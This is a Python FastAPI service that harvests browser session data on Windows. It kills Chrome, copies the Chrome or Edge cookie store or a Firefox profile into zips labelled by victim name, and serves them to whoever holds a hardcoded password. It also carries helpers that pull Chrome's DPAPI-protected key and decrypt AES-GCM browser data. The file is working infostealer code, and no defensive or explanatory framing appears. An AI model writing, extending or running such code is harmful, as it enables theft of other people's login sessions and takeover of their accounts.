from fastapi import FastAPI, HTTPException, Form, Depends, Query
from fastapi.responses import FileResponse
import os
import json
import base64
import shutil
from datetime import datetime, timedelta
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
import zipfile
import tempfile
import time
import psutil
import sqlite3

app = FastAPI()

# Database setup
DATABASE = 'file_info.db'

def init_db():
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS files (
            id INTEGER PRIMARY KEY,
            owner_name TEXT NOT NULL,
            file_path TEXT NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def get_chrome_datetime(chromedate):
    if chromedate != 86400000000 and chromedate:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except Exception as e:
            print(f"Error: {e}, chromedate: {chromedate}")
            return chromedate
    else:
        return None

def get_encryption_key(browser):
    local_state_path = {
        'chrome': os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State'),
        'edge': os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Local State')
    }[browser]

    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]  # Remove DPAPI prefix
    return CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_data(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except Exception:
        try:
            return str(CryptUnprotectData(data, None, None, None, 0)[1])
        except Exception:
            return None

def zip_folder(folder_path, zip_path):
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                zipf.write(file_path, os.path.relpath(file_path, folder_path))

def zip_files(file_paths, zip_path):
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for file_path in file_paths:
            zipf.write(file_path, os.path.basename(file_path))

def close_chrome():
    for proc in psutil.process_iter():
        try:
            if proc.name().lower() == 'chrome.exe':
                proc.terminate()
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

def copy_files(src, dest, retries=5, delay=2):
    for i in range(retries):
        try:
            shutil.copytree(src, dest, dirs_exist_ok=True)
            break
        except Exception as e:
            if i < retries - 1:
                time.sleep(delay)
            else:
                raise e

def determine_browser():
    chrome_path = os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
    edge_path = os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data')
    
    if os.path.exists(chrome_path):
        return 'chrome'
    elif os.path.exists(edge_path):
        return 'edge'
    else:
        raise ValueError("Unsupported browser or browser not installed.")

def process_browser_cookies(browser, owner_name):
    browser_paths = {
        'chrome': os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Network'),
        'firefox': os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles'),
        'edge': os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Network')
    }

    network_folder_path = browser_paths.get(browser)
    if not network_folder_path:
        raise ValueError(f"Unsupported browser: {browser}")

    timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
    zips_dir = os.path.join(os.getcwd(), 'zips')
    os.makedirs(zips_dir, exist_ok=True)
    timestamped_dir = os.path.join(zips_dir, f'{browser}_network_{timestamp}')
    os.makedirs(timestamped_dir, exist_ok=True)
    
    if browser in ['chrome', 'edge']:
        close_chrome()
        time.sleep(2)  # Give some time for Chrome to close

        if not os.path.isdir(network_folder_path):
            raise FileNotFoundError(f"The network folder path does not exist: {network_folder_path}")
        
        copy_files(network_folder_path, timestamped_dir)
    elif browser == 'firefox':
        profile_path = next(os.path.join(network_folder_path, profile) for profile in os.listdir(network_folder_path) if profile.endswith('.default-release'))
        copy_files(profile_path, timestamped_dir)
    
    zip_file_path = os.path.join(zips_dir, f'{owner_name}_{timestamp}.zip')
    zip_folder(timestamped_dir, zip_file_path)

    # Save to database
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute('INSERT INTO files (owner_name, file_path) VALUES (?, ?)', (owner_name, zip_file_path))
    conn.commit()
    conn.close()

    return zip_file_path

@app.post("/process-cookies/")
def process_cookies_route(owner_name: str = Form(...)):
    try:
        browser = determine_browser()
        zip_file_path = process_browser_cookies(browser, owner_name)
        return {"message": "Cookies processed successfully", "file_path": zip_file_path}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

def validate_password(password: str = Query(...)):
    if password != "282200123Aa?!!!":
        raise HTTPException(status_code=403, detail="Invalid password")

@app.get("/get-file/{owner_name}", dependencies=[Depends(validate_password)])
def get_file_route(owner_name: str):
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        cursor.execute('SELECT file_path FROM files WHERE owner_name = ?', (owner_name,))
        rows = cursor.fetchall()
        conn.close()

        if not rows:
            raise HTTPException(status_code=404, detail="Owner not found")

        zip_file_paths = [row[0] for row in rows]
        temp_zip_path = os.path.join(tempfile.gettempdir(), f'{owner_name}_all_files.zip')
        zip_files(zip_file_paths, temp_zip_path)

        if os.path.exists(temp_zip_path):
            return FileResponse(temp_zip_path, filename=os.path.basename(temp_zip_path))
        else:
            raise HTTPException(status_code=404, detail="Files not found")
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/get-file-link/{owner_name}", dependencies=[Depends(validate_password)])
def get_file_link(owner_name: str):
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        cursor.execute('SELECT file_path FROM files WHERE owner_name = ?', (owner_name,))
        rows = cursor.fetchall()
        conn.close()

        if not rows:
            raise HTTPException(status_code=404, detail="Owner not found")

        file_links = [{"file_name": os.path.basename(row[0]), "file_path": row[0]} for row in rows]

        return {"files": file_links}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
